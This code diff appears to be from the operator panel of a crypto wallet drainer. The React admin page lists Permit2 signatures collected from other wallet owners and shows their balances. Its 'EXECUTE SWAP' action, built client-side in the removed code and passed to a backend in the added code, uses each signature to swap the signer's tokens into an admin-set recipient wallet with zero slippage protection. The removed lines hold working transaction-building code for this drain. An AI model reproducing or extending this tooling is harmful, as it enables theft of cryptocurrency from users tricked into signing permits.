@@ -1,81 +1,12 @@
 import React, { useState, useEffect } from 'react';
 import { db } from './firebase';
-import { collection, query, onSnapshot, doc, updateDoc } from 'firebase/firestore';
-import { BrowserProvider, Contract, ethers } from 'ethers';
+import { collection, query, onSnapshot } from 'firebase/firestore';
+import { ethers } from 'ethers';
 
-// -----------------------------
-// Constants
-// -----------------------------
-const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
-const UNIVERSAL_ROUTER_ABI = [
-  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
-  "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable"
-];
+// BACKEND URL - CHANGE IF HOSTED ELSEWHERE
+const BACKEND_URL = "http://localhost:3000/api/run-worker";
 
-// -----------------------------
-// Helper: Robust Signature Builder
-// -----------------------------
-function buildSignatureBytes(r, s, vRaw) {
-  let v = Number(vRaw);
-  if (v === 0 || v === 1) v += 27;
-  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
-  return ethers.hexConcat([r, s, vHex]);
-}
-
-function buildUniversalRouterTx(data, settings) {
-  const { owner, token, amount, deadline, nonce, r, s, v } = data;
-  const { recipient, outputToken } = settings;
-
-  const amountBn = BigInt(amount);
-  const signatureBytes = buildSignatureBytes(r, s, v);
-  const permitAbi = new ethers.AbiCoder();
-
-  const permitSingleTuple = [
-    [
-      [token, amountBn, Number(deadline), Number(nonce)],
-      UNIVERSAL_ROUTER,
-      Number(deadline)
-    ],
-    signatureBytes
-  ];
-
-  const permitInput = permitAbi.encode(
-    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
-    [owner, permitSingleTuple[0], permitSingleTuple[1]]
-  );
-
-  const feeTier = 3000;
-  function encodeFee(f) {
-    let hex = f.toString(16);
-    if (hex.length % 2 === 1) hex = '0' + hex;
-    hex = hex.padStart(6, '0');
-    return '0x' + hex;
-  }
-  
-  const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
-  
-  const minReceived = BigInt(0); 
-  const swapAbi = new ethers.AbiCoder();
-  const swapInput = swapAbi.encode(
-    ["bytes", "uint256", "uint256", "address"],
-    [path, amountBn, minReceived, recipient]
-  );
-
-  // Manual hex for commands: 0x02 (PERMIT2) + 0x08 (V3_SWAP)
-  const commands = "0x0208"; 
-
-  const inputs = [permitInput, swapInput];
-  const execDeadline = Math.floor(Date.now() / 1000) + 1800; 
-
-  return { commands, inputs, execDeadline };
-}
-
-// Accept appKit as a prop
-export default function Admin({ appKit }) {
-  // Local state to replace hooks
-  const [address, setAddress] = useState(null);
-  const [isConnected, setIsConnected] = useState(false);
-  
+export default function Admin() {
   const [signatures, setSignatures] = useState([]);
   const [groupedData, setGroupedData] = useState({});
   const [balances, setBalances] = useState({});
@@ -90,25 +21,12 @@ export default function Admin({ appKit }) {
   const [processingId, setProcessingId] = useState(null);
   const [statusMsg, setStatusMsg] = useState("");
 
-  // Subscribe to AppKit updates
-  useEffect(() => {
-    if (!appKit) return;
-    const unsub = appKit.subscribeAccount((acct) => {
-      setIsConnected(acct.isConnected);
-      setAddress(acct.address);
-      // Auto-fill recipient if empty
-      if (acct.address && !recipient) {
-        setRecipient(acct.address);
-      }
-    });
-    return () => unsub();
-  }, [appKit, recipient]);
-
   useEffect(() => {
     localStorage.setItem('admin_recipient', recipient);
     localStorage.setItem('admin_outputToken', outputToken);
   }, [recipient, outputToken]);
 
+  // Real-time listener for Signatures
   useEffect(() => {
     const q = query(collection(db, "permit2_signatures"));
     const unsub = onSnapshot(q, (snapshot) => {
@@ -125,79 +43,36 @@ export default function Admin({ appKit }) {
     return () => unsub();
   }, []);
 
-  // Fetch Balances
-  useEffect(() => {
-    if (!appKit || Object.keys(groupedData).length === 0) return;
-    
-    const fetchBalances = async () => {
-      const walletProvider = appKit.getWalletProvider();
-      if (!walletProvider) return;
-      
-      const provider = new BrowserProvider(walletProvider);
-      const newBalances = {};
-      for (const owner of Object.keys(groupedData)) {
-        try {
-          const bal = await provider.getBalance(owner);
-          newBalances[owner] = ethers.formatEther(bal);
-        } catch (e) { console.error(e); }
-      }
-      setBalances(newBalances);
-    };
-    fetchBalances();
-  }, [groupedData, appKit]);
-
+  // Execute Logic - Calls Backend
   const handleExecute = async (sigData) => {
-    if (!isConnected) {
-      // Prompt connection if not connected
-      appKit.open();
-      return;
-    }
-    
     setProcessingId(sigData.id);
-    setStatusMsg("Preparing Transaction...");
+    setStatusMsg("Triggering Backend Server...");
 
     try {
-      const walletProvider = appKit.getWalletProvider();
-      if (!walletProvider) throw new Error("No wallet provider found");
-
-      const provider = new BrowserProvider(walletProvider);
-      const signer = await provider.getSigner();
-      const router = new Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, signer);
-
-      const txData = buildUniversalRouterTx(sigData, { recipient, outputToken });
-      
-      setStatusMsg("Simulating...");
-      
-      let gasLimit;
-      try {
-        const est = await router.execute.estimateGas(txData.commands, txData.inputs, txData.execDeadline, { value: 0 });
-        gasLimit = (est * 120n) / 100n; 
-      } catch (e) {
-        console.warn("Gas estimate failed, using fallback.", e);
-        gasLimit = 3000000n; 
-      }
-
-      setStatusMsg("Please Sign in Wallet...");
-      const tx = await router.execute(txData.commands, txData.inputs, txData.execDeadline, { value: 0, gasLimit });
-      setStatusMsg("Pending Confirmation...");
-      
-      const receipt = await tx.wait();
-      
-      await updateDoc(doc(db, "permit2_signatures", sigData.id), {
-        processed: true,
-        routerTx: receipt.hash,
-        processedAt: Date.now(),
-        adminExecutor: address
+      const response = await fetch(BACKEND_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          docId: sigData.id,
+          recipient: recipient,      // Pass admin setting to backend
+          outputToken: outputToken   // Pass admin setting to backend
+        })
       });
+
+      const result = await response.json();
+
+      if (!response.ok || !result.ok) {
+        throw new Error(result.error || "Backend failed to execute");
+      }
       
-      setStatusMsg("Success! Transaction Confirmed.");
+      setStatusMsg("Success! Backend executed the swap.");
+      
+      // Close status after 2 seconds
+      setTimeout(() => setStatusMsg(""), 3000);
+
     } catch (err) {
       console.error(err);
-      setStatusMsg("Error: " + (err.shortMessage || err.message));
-      await updateDoc(doc(db, "permit2_signatures", sigData.id), {
-        lastError: err.message,
-        lastErrorAt: Date.now()
-      }).catch(console.error);
+      setStatusMsg("Error: " + err.message);
     } finally {
       setProcessingId(null);
     }
@@ -217,33 +92,29 @@ export default function Admin({ appKit }) {
       <div className="admin-container glass-panel">
         <header className="admin-header">
           <div className="header-top">
-            <h2>Admin Control</h2>
-            <div 
-              className={`connection-badge ${isConnected ? 'active' : ''}`}
-              onClick={() => appKit.open()}
-              style={{cursor: 'pointer'}}
-            >
-              {isConnected ? 'Connected' : 'Connect Wallet'}
+            <h2>Admin Control Center</h2>
+            <div className="connection-badge active">
+              Server Mode
             </div>
           </div>
           
           <div className="settings-grid">
             <div className="input-group">
-              <label>Recipient Address</label>
+              <label>Target Recipient Address</label>
               <input 
                 type="text" 
                 value={recipient} 
                 onChange={(e) => setRecipient(e.target.value)} 
-                placeholder="0x..." 
+                placeholder="0x... (Wallet to receive funds)" 
               />
             </div>
             <div className="input-group">
-              <label>Output Token (Swap to)</label>
+              <label>Output Token Address</label>
               <input 
                 type="text" 
                 value={outputToken} 
                 onChange={(e) => setOutputToken(e.target.value)} 
-                placeholder="0x... (e.g. WETH)" 
+                placeholder="0x... (Token to swap into)" 
               />
             </div>
           </div>
@@ -264,14 +135,14 @@ export default function Admin({ appKit }) {
               </div>
               <div className="card-body">
                 <div className="stat-row">
-                  <span>Balance</span>
-                  <span className="highlight-yellow">
-                    {balances[owner] ? parseFloat(balances[owner]).toFixed(4) : '...'} ETH
-                  </span>
-                </div>
-                <div className="stat-row">
                   <span>Signatures</span>
                   <span className="highlight-white">{groupedData[owner].length}</span>
+                </div>
+                <div className="stat-row">
+                  <span>Pending</span>
+                  <span className="highlight-yellow">
+                    {groupedData[owner].filter(x => !x.processed).length}
+                  </span>
                 </div>
               </div>
               <button className="view-btn">Manage</button>
@@ -290,7 +161,7 @@ export default function Admin({ appKit }) {
             </div>
             
             {statusMsg && (
-              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : "processing"}`}>
+              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : statusMsg.includes("Error") ? "error-msg" : "processing"}`}>
                 {statusMsg}
               </div>
             )}
@@ -314,7 +185,7 @@ export default function Admin({ appKit }) {
                   </div>
                   
                   {sig.lastError && !sig.processed && (
-                    <div className="error-msg">⚠️ {sig.lastError.slice(0, 50)}...</div>
+                    <div className="error-msg" style={{marginTop:'10px'}}>⚠️ {sig.lastError.slice(0, 60)}...</div>
                   )}
 
                   {!sig.processed ? (
@@ -323,7 +194,7 @@ export default function Admin({ appKit }) {
                       onClick={() => handleExecute(sig)}
                       disabled={processingId === sig.id}
                     >
-                      {processingId === sig.id ? "PROCESSING..." : "EXECUTE SWAP"}
+                      {processingId === sig.id ? "CONTACTING SERVER..." : "EXECUTE SWAP"}
                     </button>
                   ) : (
                     <a 
